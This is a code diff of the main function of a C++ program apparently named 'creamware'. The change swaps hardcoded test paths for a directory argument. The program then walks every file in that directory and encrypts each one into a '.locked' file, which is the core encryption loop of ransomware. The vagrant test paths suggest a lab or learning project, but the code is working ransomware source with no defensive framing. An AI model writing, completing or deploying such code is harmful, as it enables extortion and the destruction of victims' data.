@@ -51,35 +51,33 @@ void FindFile(const std::wstring& directory, wstring ext, queue<wstring>& result
 //params: <input file> <output file> <is decrypt mode> <key>
 int wmain(int argc, wchar_t* argv[])
 {
-    /*
-    if (argc < 4) {
-        printf("params: <input file> <output file> <is decrypt mode> [*key]\n");
-        system("pause");
+
+    const wchar_t* help =
+        L"[*] This is  manpage\n"
+        L"[+] usage: creamware <dirpath>";
+
+    if (argc <= 1) {
+        wcout << help;
         return 0;
-    }*/
-
-    const wchar_t* filename = L"c:\\users\\vagrant\\Desktop\\important.txt";
-    const wchar_t* filename2 = L"c:\\users\\vagrant\\Desktop\\important.locked";
-
-    wstring directoryPath2 = L"C:\\Users\\vagrant\\Desktop\\testransom";
-    queue<wstring> results;
-    // TODO: list of extensions
-    FindFile(directoryPath2, L"", results);
-
-    wstring el;
-    cout << "popping" << endl;
-    while (results.size()) {
-        el = results.front();
-
-        wcout << "ciphering " << el.c_str() << endl;
-        wcout << "ciphering " << (el + L".locked").c_str() << endl;
-        encryptFile(el.c_str(), (el + L".locked").c_str(), false);
-
-        results.pop();
-        wcout << el << endl;
     }
 
-    cout << "queue ready" << endl;
-    cout << "number of el " << results.size() << endl;
+    const wchar_t* directoryPath = argv[1];
+
+    queue<wstring> results;
+    FindFile(directoryPath, L"", results);
+
+    wstring(fileName);
+    wstring(newFileName);
+    while (results.size()) {
+        fileName = results.front();
+        newFileName = (fileName + L".locked");
+
+        wcout << "[*] Encrypting " << fileName;
+        wcout << "to " << newFileName << endl;
+        encryptFile(fileName.c_str(), newFileName.c_str(), false);
+
+        results.pop();
+        wcout << fileName << endl;
+    }
     return 0;
 }
